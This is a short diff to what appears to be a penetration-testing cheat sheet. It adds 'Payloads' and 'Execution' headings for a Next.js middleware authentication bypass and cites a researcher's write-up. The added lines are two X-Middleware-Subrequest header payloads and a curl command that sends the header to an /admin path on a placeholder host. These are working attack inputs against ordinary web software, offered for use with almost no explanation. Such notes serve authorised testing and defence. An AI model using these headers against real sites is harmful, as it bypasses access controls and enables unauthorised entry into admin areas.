@@ -2101,9 +2101,17 @@ if __name__ == "__main__":
 
 > https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
 
+### Payloads
+
 ```console
 X-Middleware-Subrequest: middleware
 ```
+
+```console
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+```
+
+### Execution
 
 ```console
 $ curl -H "X-Middleware-Subrequest: middleware" https://<RHOST>/admin
